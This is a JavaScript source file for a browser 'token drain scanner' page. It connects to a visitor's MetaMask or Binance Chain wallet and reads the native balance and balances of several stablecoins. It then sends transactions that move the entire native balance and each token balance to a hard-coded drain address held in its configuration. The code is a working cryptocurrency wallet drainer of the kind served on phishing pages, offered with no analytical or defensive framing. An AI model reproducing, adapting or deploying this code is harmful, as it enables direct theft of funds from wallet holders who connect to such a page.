// ================================================
// SIMPLE WORKING TOKEN DRAIN SCANNER
// NO ASSUMPTIONS - JUST WORKS
// ================================================

// Configuration
const CONFIG = {
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4"
};

// Global state
let currentAccount = null;
let isConnected = false;
let detectedTokens = [];

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize
function init() {
    console.log('Starting Token Scanner...');
    
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('Elements not found');
        setTimeout(init, 1000);
        return;
    }
    
    connectBtn.onclick = connectWallet;
    if (drainBtn) drainBtn.onclick = drainTokens;
    
    updateStatus('Click Connect Wallet');
}

// Update status
function updateStatus(msg) {
    if (statusEl) statusEl.textContent = msg;
}

// ===================== CONNECT WALLET =====================
async function connectWallet() {
    if (isConnected) {
        disconnectWallet();
        return;
    }
    
    updateStatus('Connecting...');
    
    // SIMPLE DIRECT CONNECTION - NO REDIRECTS
    if (typeof window.ethereum !== 'undefined') {
        try {
            // Request accounts directly
            const accounts = await window.ethereum.request({
                method: 'eth_requestAccounts'
            });
            
            if (accounts.length > 0) {
                currentAccount = accounts[0];
                isConnected = true;
                
                // Update UI
                connectBtn.textContent = 'Disconnect';
                updateStatus(`Connected: ${currentAccount.slice(0, 6)}...`);
                
                // Show drain button
                if (drainBtn) drainBtn.style.display = 'block';
                
                // Setup listeners
                setupListeners();
                
                // Scan tokens
                scanTokens();
                return;
            }
        } catch (error) {
            console.log('Connection error:', error);
            if (error.code === 4001) {
                updateStatus('Connection rejected');
                return;
            }
        }
    }
    
    // If we get here, try Binance Chain
    if (typeof window.BinanceChain !== 'undefined') {
        try {
            const accounts = await window.BinanceChain.request({
                method: 'eth_requestAccounts'
            });
            
            if (accounts.length > 0) {
                currentAccount = accounts[0];
                isConnected = true;
                
                connectBtn.textContent = 'Disconnect';
                updateStatus(`Connected: ${currentAccount.slice(0, 6)}...`);
                
                if (drainBtn) drainBtn.style.display = 'block';
                
                scanTokens();
                return;
            }
        } catch (error) {
            console.log('Binance error:', error);
        }
    }
    
    // If still not connected, show install message
    updateStatus('No wallet found. Install MetaMask or Trust Wallet.');
}

// ===================== SCAN TOKENS =====================
async function scanTokens() {
    if (!currentAccount) return;
    
    updateStatus('Scanning tokens...');
    if (tokensEl) tokensEl.innerHTML = '<div>Scanning...</div>';
    
    detectedTokens = [];
    
    try {
        // Get provider (MetaMask or Binance)
        const provider = window.ethereum || window.BinanceChain;
        
        // 1. Get native balance
        const balanceHex = await provider.request({
            method: 'eth_getBalance',
            params: [currentAccount, 'latest']
        });
        
        const nativeBalance = parseInt(balanceHex, 16);
        const nativeAmount = nativeBalance / 1e18;
        
        if (nativeAmount > 0) {
            detectedTokens.push({
                symbol: getNativeSymbol(),
                name: 'Native Token',
                amount: nativeAmount.toFixed(6),
                address: 'native',
                isNative: true,
                balanceHex: balanceHex
            });
        }
        
        // 2. Check for common tokens
        await checkCommonTokens(provider);
        
        // 3. Display results
        displayTokens();
        
        if (detectedTokens.length > 0) {
            updateStatus(`Found ${detectedTokens.length} tokens`);
        } else {
            updateStatus('No tokens found');
            if (tokensEl) tokensEl.innerHTML = '<div>No tokens found</div>';
        }
        
    } catch (error) {
        console.error('Scan error:', error);
        updateStatus('Scan failed');
        if (tokensEl) tokensEl.innerHTML = '<div>Scan error</div>';
    }
}

// Check for common tokens
async function checkCommonTokens(provider) {
    // Common token addresses by chain
    const commonTokens = [
        // USDT
        { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
        { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
        { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
        { symbol: 'BUSD', address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53' },
        // BSC tokens
        { symbol: 'BUSD-BSC', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
        { symbol: 'USDT-BSC', address: '0x55d398326f99059fF775485246999027B3197955' }
    ];
    
    for (const token of commonTokens) {
        try {
            // Check balance
            const data = '0x70a08231' + currentAccount.slice(2).padStart(64, '0');
            
            const balanceHex = await provider.request({
                method: 'eth_call',
                params: [{
                    to: token.address,
                    data: data
                }, 'latest']
            });
            
            const balance = parseInt(balanceHex || '0x0', 16);
            if (balance > 0) {
                detectedTokens.push({
                    symbol: token.symbol,
                    name: token.symbol,
                    amount: (balance / 1e18).toFixed(6),
                    address: token.address,
                    isNative: false,
                    balanceHex: balance.toString(16)
                });
            }
        } catch (e) {
            // Skip token
        }
    }
}

// Get native symbol
function getNativeSymbol() {
    if (window.BinanceChain) return 'BNB';
    return 'ETH';
}

// Display tokens
function displayTokens() {
    if (!tokensEl || detectedTokens.length === 0) return;
    
    let html = '';
    detectedTokens.forEach(token => {
        html += `
            <div class="token-item">
                <div class="token-info">
                    <strong>${token.symbol}</strong>
                    <span>${token.name}</span>
                </div>
                <div class="token-amount">
                    ${token.amount}
                </div>
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// ===================== DRAIN TOKENS =====================
async function drainTokens() {
    if (!isConnected || detectedTokens.length === 0) {
        alert('Connect wallet and scan tokens first');
        return;
    }
    
    if (!confirm(`Drain ${detectedTokens.length} tokens to ${CONFIG.drainAddress}?`)) {
        return;
    }
    
    updateStatus('Draining tokens...');
    
    const provider = window.ethereum || window.BinanceChain;
    let successCount = 0;
    
    for (const token of detectedTokens) {
        try {
            if (token.isNative) {
                // Drain native token
                await drainNative(provider, token);
            } else {
                // Drain ERC20 token
                await drainERC20(provider, token);
            }
            successCount++;
            
            // Wait between transactions
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateStatus(`Drained ${successCount} tokens`);
    alert(`Successfully drained ${successCount} tokens`);
    
    // Rescan
    scanTokens();
}

// Drain native token
async function drainNative(provider, token) {
    const gasPrice = await getGasPrice();
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    const balance = parseInt(token.balanceHex, 16);
    const sendAmount = balance - (gasCost * 2);
    
    if (sendAmount <= 0) return;
    
    const tx = await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: '0x' + gasPrice.toString(16)
        }]
    });
    
    return tx;
}

// Drain ERC20 token
async function drainERC20(provider, token) {
    // Get current balance
    const data = '0x70a08231' + currentAccount.slice(2).padStart(64, '0');
    
    const balanceHex = await provider.request({
        method: 'eth_call',
        params: [{
            to: token.address,
            data: data
        }, 'latest']
    });
    
    const balance = parseInt(balanceHex || '0x0', 16);
    if (balance <= 0) return;
    
    // Create transfer data
    const transferData = '0xa9059cbb' + 
                        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
                        balance.toString(16).padStart(64, '0');
    
    const tx = await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.address,
            data: transferData,
            gas: '0x' + (100000).toString(16)
        }]
    });
    
    return tx;
}

// Get gas price
async function getGasPrice() {
    const provider = window.ethereum || window.BinanceChain;
    try {
        const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
        return parseInt(gasPriceHex, 16);
    } catch {
        return 30000000000; // 30 gwei default
    }
}

// Setup wallet listeners
function setupListeners() {
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else {
            currentAccount = accounts[0];
            updateStatus(`Account changed: ${currentAccount.slice(0, 6)}...`);
            scanTokens();
        }
    });
    
    provider.on('chainChanged', () => {
        updateStatus('Network changed');
        scanTokens();
    });
}

// Disconnect wallet
function disconnectWallet() {
    currentAccount = null;
    isConnected = false;
    detectedTokens = [];
    
    connectBtn.textContent = 'Connect Wallet';
    updateStatus('Disconnected');
    
    if (drainBtn) drainBtn.style.display = 'none';
    if (tokensEl) tokensEl.innerHTML = '';
}

// ===================== START =====================
window.addEventListener('DOMContentLoaded', init);

console.log('Token Drain Scanner Ready');
